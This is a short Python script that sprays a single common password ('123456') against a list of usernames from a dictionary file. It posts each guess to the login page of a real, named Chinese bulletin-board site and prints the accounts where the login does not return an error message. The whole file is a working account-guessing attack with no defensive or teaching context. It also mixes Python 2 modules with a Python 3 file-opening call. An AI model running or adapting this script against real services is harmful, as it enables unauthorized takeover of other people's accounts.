# -*- coding: utf-8 -*-
import httplib, urllib

def Check(username, password):
    params = urllib.urlencode(
        {'userid': username, 'passwd': password})
    headers = {"Content-type":
        "application/x-www-form-urlencoded"}
    conn = httplib.HTTPSConnection("www.bdwm.net")
    conn.request("POST",
        "/bbs/bbslog2.php", params, headers)
    res = conn.getresponse().read()
    conn.close()
    if res.find(u"密码不正确") != -1:
        return False
    elif res.find(u"不存在这个用户") != -1:
        return False
    else:
        return True

for i in open("English.Dic",encoding='utf8'):
    if Check(i.rstrip(),"123456"):
        print(i)